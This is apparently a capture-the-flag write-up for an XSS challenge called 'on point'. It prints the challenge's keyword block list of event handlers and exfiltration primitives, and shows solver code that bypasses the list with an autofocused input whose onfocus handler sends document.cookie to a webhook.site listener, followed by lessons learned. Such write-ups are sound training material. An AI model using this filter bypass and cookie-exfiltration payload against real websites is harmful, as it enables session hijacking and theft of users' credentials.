# BYU 2026 CTF, on point challenge

## general information 

### AI usage:
This challenge was solved with the approach of using as little AI as possible 

The only prompt involved in the solution of the challenge was the following:

```
Is there somewhere a list of all  "onload", "onerror", "ontoggle", "onmouseover", "onmouseenter",
    "onmouseleave", "onmouseout", "onmousedown", "onmouseup", "ondblclick",
    "onclick", "onscroll", "onwheel", "onresize", "onkeydown", "onkeyup",
    "onkeypress", "onsubmit", "onchange", "oninput", "onblur",
    "oncontextmenu", "onpointerover", "onpointerdown", "onpointerup",
    "onpageshow", "onpagehide", "onhashchange", "onanimation", "ontransition",

like things that one can put on a html element?
```

And conveniently, the AI, after giving links to some resources, also gave a list of some event handlers, which I was able to iterate through 

```
Category	Examples	Description
Mouse	onmousedown, onmouseup, onmouseover, onmouseout, onmousemove, oncontextmenu	Actions involving mouse clicks, movement, and right-clicks.
Keyboard	onkeydown, onkeyup, onkeypress	Actions involving pressing and releasing keys.
Form	onsubmit, onchange, oninput, onfocus, onblur	Actions when forms are submitted or input values change.
Window/Document	onload, onunload, onresize, onscroll, onpageshow	Actions related to the browser window or entire page loading.
Pointer	onpointerdown, onpointerup, onpointerover	Unified events for mouse, touch, and pen input.
Media	onabort, oncanplay, onended, onerror	Events for <video>, <audio>, and <img> elements.
Animation/Transition	onanimationstart, ontransitionend	Events triggered by CSS animations and transitions.
```

## description and exploit 

The task description:
```
The last XSS challenge was too easy. And I hate you. So I tried to think of every possible JS function that could possible be used to XSS my website. I will give you source code though because I'm not a monster.

NOTE: You can report suspicious posts to the admin below.
```

The on-point task was about an XSS vulnerability, as stated in the task description.
And within a short time, it became clear there was an XSS vulnerability when creating posts. 
As usual in these exercises, there was also a bot script that emulates a victim visiting a website with an XSS vulnerability. 
The bot set a cookie with the flag that was supposed to be extracted with XSS. 

However, user input was sanitized so that one could not simply solve the exercise with a simple script tag.

------------------------------------------
```
# filter out XSS!
# blocks the most common event handlers and exfiltration primitives
_BLOCKED = [
    "script",
    "fetch",
    "xmlhttprequest",
    "onload",
    "onerror",
    "ontoggle",
    "onmouseover",
    "onmouseenter",
    "onmouseleave",
    "onmouseout",
    "onmousedown",
    "onmouseup",
    "ondblclick",
    "onclick",
    "onscroll",
    "onwheel",
    "onresize",
    "onkeydown",
    "onkeyup",
    "onkeypress",
    "onsubmit",
    "onchange",
    "oninput",
    "onblur",
    "oncontextmenu",
    "onpointerover",
    "onpointerdown",
    "onpointerup",
    "onpageshow",
    "onpagehide",
    "onhashchange",
    "onanimation",
    "ontransition",
]


def filter_str(s):
    for keyword in _BLOCKED:
        if re.search(keyword, s, re.IGNORECASE):
            print(f"ERROR: found {keyword} in {s}")
            return True
    return False
```
-----------------------

Searching for a list of all DOM object events that you could listen to in html, so that I could look which of them where not beeing sanitized, took longer than i would have liked. 
Eventually, with some help from AI, I found this nice resource [see general information](#general-information)

https://www.w3schools.com/jsref/dom_obj_event.asp

And there I found the onfocus element, which conveniently did not appear in the list. 
And shortly after, I found the autofocus property that allowed me to automatically focus the element without user intervention.

Having our "javascript trigger" the next thing to do was to develop a js payload: 

All that was left to do was create the XSS js payload, as well as the overall HTML we would submit, and have some webhook to receive the cookies that the XSS would send 

``` 
    print("running.....")
    print("sending request")
    XSStarg = "https://onpoint.chals.cyberjousting.com/"
    admin_endpoint = "https://admin.chals.cyberjousting.com/report"
    print(f"XSStarg: {XSStarg}")
    print(f"admin_endpoint: {admin_endpoint}")
    print(f"our ip: {ip6_adr}, {ip4_adr}")

    oursrv = f"https://webhook.site/<insert your webhook>/"
    print(f"ourlistner: {oursrv}")
    XSSpost = (
        '<form id="q"><input name="gotcha" onfocus="'
        + "let form = document.getElementById(`q`);"
        + f"form.action=`{oursrv}`"
        + "+ (document.cookie);"
        + "form.submit()"
        + '" autofocus/><form>'
    )
    print(XSSpost)
```

The code uses weebhook.site to set up a listener
And the code creates a form with an input that is autofocused, so that when it gets focused, it submits the form to our webhook together with the cookies stored inside the path 

All that is left to do is create a post with the XSSpayload,
figure out the URL of the post, by getting our session ID, which is possible by accessing the / path, which secretly contains the session ID 

```
    matches = re.findall(r'input name="postID" type="hidden" value="(.*)"', resp.text)
    print(matches)
    for match in matches:
        postID = match
        assert isinstance(postID, str)

    XSSpost_url = XSStarg + f"getpost?id={postID}"
```

and finally send the URL to the admin 

# Lessons and takeaways
## The time of exploit development 

Although the exercise is easy, figuring out what the vulnerability was, as well as getting a rough idea of how to exploit it, took less than a few minutes 
The actual development of the payload took way longer than I would have liked 

I would list the following three main reasons for this: 
- Finding a concrete "javascript trigger" (in the final exploit, this was: onfocus) 
    - It was clear from the start that we were supposed to give an XSS payload to the post 
    - And I was pretty sure that there had to be a "javascript trigger"(things like onclick, onload, oninput) that did not get sanitized 
    - I tried for some time to get a curated list by using the browser, but the search results were not what I was looking for, consisting mostly of beginner tutorials like "how to use event listeners." 
    - Eventually, I asked AI to do the searching for me, and quickly got a resource that matched what I was looking for

- developing and testing the exploit 
    - Although I had a rough idea of how to solve the exercise, my approach to developing the exploit lacked initial clarity and a reasonable setup that allowed me to quickly iterate over exploit variants 
    - Another issue was that I was too hasty, by jumping from too quickly skimming the code to directly going headfirst into developing the exploit 
    - An example of this is that while I was developing the XSS payload, I was not aware that I also had to figure out the ID of the post     
        - When it became time to do that, I spent some time trying to figure out if I could perhaps reverse engineer the session ID based on the session cookie, when in fact there was an easier way to do it by simply visiting the page at the root path / 
    - Another example of this is that I skimmed over the code so quickly that I did not realize that there was also a separate sanitization of the ' character, which I could have easily seen coming if I read the code that followed the use of the filter function 

- Setting up a listener for the XSS 
    - Setting up ngrok was a disaster that failed 
    - I tried it over ipv6 for a while 
    - Finally, I got a recommendation for webhook.site, which was a perfect fit for this simple task 


# Takeaways and useful resources 
- Once you have a broad idea for the exploit. try to develop a clearer picture of how the whole exploit is going to play out
    - Create some sort of mental list of all the things your exploit does step by step 
- Have a clear idea of what step of the exploit you are currently working on 
- Don't be too hasty when reading the code 
    - Make sure you look at the logic that happens before and after, the vulnerabilities you exploit, and other critical or difficult parts of your exploit 
- Have some notion of how difficult the development of the exploit will be, have a rough expectation of how likely it is that your exploit (or some part of it will work FLAWLESSLY) 
    - If you have done something many times and can confidently say that it's not that likely for things to go wrong, you can get away with quickly coding up an exploit  
    - Else code your exploit with the knowledge in the back of your mind that it probably won't work the first time 
        - Insert debug prints
        - Make sure to implement sanity checks that verify that your exploit is doing what it is supposed to 
        - Make sure you make a setup that allows you to quickly iterate over solutions and try things out 
        - Because if something goes wrong, which it probably will, this WILL save you a LOT of time 


- Useful resources 
    - Setting up webhooks https://webhook.site/
    - A list of event listeners you can skim through https://www.w3schools.com/jsref/dom_obj_event.asp

 
